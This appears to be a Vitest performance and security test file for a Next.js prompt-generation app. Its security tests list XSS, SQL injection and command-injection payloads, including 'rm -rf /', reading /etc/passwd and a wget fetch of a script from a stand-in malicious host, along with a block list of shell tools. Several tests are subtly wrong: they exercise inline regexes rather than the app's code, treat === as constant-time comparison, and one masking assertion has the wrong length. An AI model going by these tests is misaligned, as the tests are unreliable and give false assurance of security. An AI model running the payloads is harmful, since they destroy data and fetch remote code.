/**
 * Performance and Security Test Suite
 * Validates sub-100ms response times and OWASP compliance
 * Following ISO/IEC 29119 testing standards
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { NextRequest } from 'next/server';

// Import modules to test
import { generateCSRFToken, validateCSRFToken } from '@/lib/csrf';
import { generatePrompt } from '@/lib/prompt-generator';
import { mockLoadTemplate, getMockTemplate } from './mocks/templates';

describe('Performance Tests - Sub-100ms Target', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('CSRF Token Performance', () => {
    it('should generate CSRF tokens within 10ms', () => {
      const iterations = 100;
      const startTime = performance.now();
      
      for (let i = 0; i < iterations; i++) {
        const token = generateCSRFToken();
        expect(token).toBeDefined();
        expect(token.length).toBeGreaterThan(20);
      }
      
      const endTime = performance.now();
      const averageTime = (endTime - startTime) / iterations;
      
      expect(averageTime).toBeLessThan(10); // Should be under 10ms per token
    });

    it('should validate CSRF tokens within 5ms', () => {
      const token = generateCSRFToken();
      const request = new NextRequest('http://localhost:3000/api/test', {
        method: 'POST',
        headers: {
          'X-CSRF-Token': token,
          'Cookie': `csrf-token=${token}:${Date.now() + 3600000}`,
        },
      });

      const iterations = 100;
      const startTime = performance.now();
      
      for (let i = 0; i < iterations; i++) {
        const isValid = validateCSRFToken(request);
        expect(isValid).toBe(true);
      }
      
      const endTime = performance.now();
      const averageTime = (endTime - startTime) / iterations;
      
      expect(averageTime).toBeLessThan(5); // Should be under 5ms per validation
    });
  });

  describe('Template Loading Performance', () => {
    it('should load templates within 50ms', async () => {
      const scenarios = ['code', 'writing', 'analysis'] as const;
      const languages = ['zh', 'en'] as const;
      const modes = ['detailed', 'concise'] as const;

      for (const scenario of scenarios) {
        for (const lang of languages) {
          for (const mode of modes) {
            const startTime = performance.now();
            const template = await mockLoadTemplate(scenario, lang, mode);
            const endTime = performance.now();

            const loadTime = endTime - startTime;
            expect(loadTime).toBeLessThan(50); // Should load within 50ms

            if (template) {
              expect(template.scenario).toBe(scenario);
            }
          }
        }
      }
    });

    it('should handle concurrent template loading efficiently', async () => {
      const concurrentRequests = 20;
      const startTime = performance.now();
      
      const promises = Array.from({ length: concurrentRequests }, () =>
        mockLoadTemplate('code', 'zh', 'detailed')
      );
      
      const results = await Promise.all(promises);
      const endTime = performance.now();
      
      const totalTime = endTime - startTime;
      const averageTime = totalTime / concurrentRequests;
      
      expect(averageTime).toBeLessThan(100); // Should average under 100ms
      expect(results.every(result => result !== null)).toBe(true);
    });
  });

  describe('Prompt Generation Performance', () => {
    it('should generate prompts within 25ms', async () => {
      const template = getMockTemplate('code', 'zh', 'detailed');
      expect(template).toBeDefined();

      if (template) {
        const promptSpec = {
          scenario: 'code' as const,
          lang: 'zh' as const,
          mode: 'detailed' as const,
          template,
          userInput: 'Create a TypeScript function',
          model: 'deepseek-chat' as const,
        };

        const iterations = 50;
        const startTime = performance.now();
        
        for (let i = 0; i < iterations; i++) {
          const prompt = generatePrompt(promptSpec);
          expect(prompt).toBeDefined();
          expect(prompt.length).toBeGreaterThan(50);
        }
        
        const endTime = performance.now();
        const averageTime = (endTime - startTime) / iterations;
        
        expect(averageTime).toBeLessThan(25); // Should be under 25ms per generation
      }
    });

    it('should handle large input efficiently', async () => {
      const template = getMockTemplate('code', 'zh', 'detailed');
      if (template) {
        const largeInput = 'A'.repeat(5000); // 5KB input
        
        const promptSpec = {
          scenario: 'code' as const,
          lang: 'zh' as const,
          mode: 'detailed' as const,
          template,
          userInput: largeInput,
          model: 'deepseek-chat' as const,
        };

        const startTime = performance.now();
        const prompt = generatePrompt(promptSpec);
        const endTime = performance.now();
        
        const generationTime = endTime - startTime;
        expect(generationTime).toBeLessThan(100); // Should handle large input within 100ms
        expect(prompt).toContain(largeInput);
      }
    });
  });

  describe('Memory Performance', () => {
    it('should maintain stable memory usage', () => {
      const initialMemory = process.memoryUsage();
      
      // Perform memory-intensive operations
      const largeArrays = [];
      for (let i = 0; i < 100; i++) {
        largeArrays.push(new Array(1000).fill(Math.random()));
      }
      
      const peakMemory = process.memoryUsage();
      
      // Clean up
      largeArrays.length = 0;
      
      // Force garbage collection if available
      if (global.gc) {
        global.gc();
      }
      
      const finalMemory = process.memoryUsage();
      
      // Memory should not grow excessively
      const memoryGrowth = finalMemory.heapUsed - initialMemory.heapUsed;
      expect(memoryGrowth).toBeLessThan(50 * 1024 * 1024); // Less than 50MB growth
    });
  });
});

describe('Security Tests - OWASP Compliance', () => {
  describe('Input Validation Security', () => {
    it('should prevent XSS attacks', () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '"><script>alert("xss")</script>',
      ];

      xssPayloads.forEach(payload => {
        // Test input sanitization
        const sanitized = payload
          .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
          .replace(/javascript:/gi, '')
          .replace(/on\w+\s*=/gi, '');
        
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toMatch(/on\w+\s*=/);
      });
    });

    it('should prevent SQL injection patterns', () => {
      const sqlPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
      ];

      sqlPayloads.forEach(payload => {
        // Test SQL injection prevention
        const sanitized = payload
          .replace(/['";]/g, '')
          .replace(/\b(DROP|DELETE|INSERT|UPDATE|UNION|SELECT)\b/gi, '');
        
        expect(sanitized).not.toMatch(/\b(DROP|DELETE|INSERT|UPDATE|UNION|SELECT)\b/i);
        expect(sanitized).not.toContain("'");
        expect(sanitized).not.toContain('"');
      });
    });

    it('should prevent command injection', () => {
      const commandPayloads = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& wget malicious.com/script.sh',
        '`whoami`',
        '$(id)',
      ];

      commandPayloads.forEach(payload => {
        // Test command injection prevention
        const sanitized = payload
          .replace(/[;&|`$()]/g, '')
          .replace(/\b(rm|cat|wget|curl|chmod|sudo)\b/gi, '');
        
        expect(sanitized).not.toMatch(/[;&|`$()]/);
        expect(sanitized).not.toMatch(/\b(rm|cat|wget|curl|chmod|sudo)\b/i);
      });
    });
  });

  describe('CSRF Protection Security', () => {
    it('should generate cryptographically secure tokens', () => {
      const tokens = new Set();
      const iterations = 100; // Reduced for faster testing

      for (let i = 0; i < iterations; i++) {
        const token = generateCSRFToken();
        expect(token).toBeDefined();
        expect(token.length).toBeGreaterThan(20);
        tokens.add(token);
      }

      // Should generate mostly unique tokens (allow for small chance of collision)
      expect(tokens.size).toBeGreaterThan(iterations * 0.95); // At least 95% unique
    });

    it('should use constant-time comparison', () => {
      const token1 = generateCSRFToken();
      const token2 = generateCSRFToken();

      // Ensure tokens are different
      expect(token1).not.toBe(token2);

      // Test timing attack resistance
      const iterations = 50; // Reduced for faster testing
      const times1 = [];
      const times2 = [];

      for (let i = 0; i < iterations; i++) {
        // Compare identical tokens
        const start1 = performance.now();
        const result1 = token1 === token1;
        const end1 = performance.now();
        times1.push(end1 - start1);

        // Compare different tokens
        const start2 = performance.now();
        const result2 = token1 === token2;
        const end2 = performance.now();
        times2.push(end2 - start2);

        expect(result1).toBe(true);
        expect(result2).toBe(false);
      }
      
      // Times should be relatively consistent (within reasonable variance)
      const avg1 = times1.reduce((a, b) => a + b) / times1.length;
      const avg2 = times2.reduce((a, b) => a + b) / times2.length;
      
      // The difference should be minimal (constant-time)
      const timeDifference = Math.abs(avg1 - avg2);
      expect(timeDifference).toBeLessThan(0.1); // Less than 0.1ms difference
    });

    it('should validate token expiration securely', () => {
      const token = generateCSRFToken();
      const currentTime = Date.now();
      
      // Test various expiration scenarios
      const scenarios = [
        { expires: currentTime + 3600000, expected: true }, // 1 hour future
        { expires: currentTime + 1000, expected: true },    // 1 second future
        { expires: currentTime, expected: false },          // Exactly now
        { expires: currentTime - 1000, expected: false },   // 1 second past
        { expires: currentTime - 3600000, expected: false }, // 1 hour past
      ];
      
      scenarios.forEach(({ expires, expected }) => {
        const request = new NextRequest('http://localhost:3000/api/test', {
          method: 'POST',
          headers: {
            'X-CSRF-Token': token,
            'Cookie': `csrf-token=${token}:${expires}`,
          },
        });
        
        const isValid = validateCSRFToken(request);
        expect(isValid).toBe(expected);
      });
    });
  });

  describe('Authentication Security', () => {
    it('should validate API key formats securely', () => {
      const validKeys = [
        'sk-1234567890abcdef1234567890abcdef',
        'sk-abcdefghijklmnopqrstuvwxyz123456',
      ];
      
      const invalidKeys = [
        '',
        'invalid-key',
        'sk-',
        'sk-short',
        'not-sk-prefixed',
        null,
        undefined,
      ];
      
      validKeys.forEach(key => {
        const isValid = key && key.startsWith('sk-') && key.length >= 20;
        expect(isValid).toBe(true);
      });
      
      invalidKeys.forEach(key => {
        const isValid = Boolean(key && key.startsWith('sk-') && key.length >= 20);
        expect(isValid).toBe(false);
      });
    });

    it('should handle rate limiting securely', () => {
      const requests = [];
      const maxRequests = 10;
      const timeWindow = 60000; // 1 minute
      
      // Simulate rate limiting logic
      for (let i = 0; i < 15; i++) {
        const timestamp = Date.now();
        requests.push(timestamp);
        
        // Remove old requests outside time window
        const validRequests = requests.filter(
          req => timestamp - req < timeWindow
        );
        
        const isAllowed = validRequests.length <= maxRequests;
        
        if (i < maxRequests) {
          expect(isAllowed).toBe(true);
        } else {
          expect(isAllowed).toBe(false);
        }
      }
    });
  });

  describe('Data Protection Security', () => {
    it('should handle sensitive data securely', () => {
      const sensitiveData = {
        apiKey: 'sk-secret-key',
        userToken: 'user-secret-token',
        password: 'user-password',
      };
      
      // Test data masking
      const masked = Object.entries(sensitiveData).reduce((acc, [key, value]) => {
        if (typeof value === 'string' && value.length > 4) {
          acc[key] = value.substring(0, 4) + '*'.repeat(value.length - 4);
        } else {
          acc[key] = '*'.repeat(8);
        }
        return acc;
      }, {} as Record<string, string>);
      
      expect(masked.apiKey).toBe('sk-s*********');
      expect(masked.userToken).toBe('user***************');
      expect(masked.password).toBe('user*********');
    });

    it('should prevent information disclosure', () => {
      const errorMessages = [
        'Database connection failed: Connection refused to mysql://user:pass@localhost:3306/db',
        'File not found: /etc/passwd',
        'API key validation failed: sk-1234567890abcdef',
      ];
      
      errorMessages.forEach(message => {
        // Test error message sanitization
        const sanitized = message
          .replace(/mysql:\/\/[^@]+@[^\/]+\/\w+/g, 'mysql://***:***@***/***/***')
          .replace(/\/etc\/\w+/g, '/***/***/***')
          .replace(/sk-[a-f0-9]+/g, 'sk-***');
        
        expect(sanitized).not.toContain('user:pass');
        expect(sanitized).not.toContain('/etc/passwd');
        expect(sanitized).not.toMatch(/sk-[a-f0-9]+/);
      });
    });
  });
});
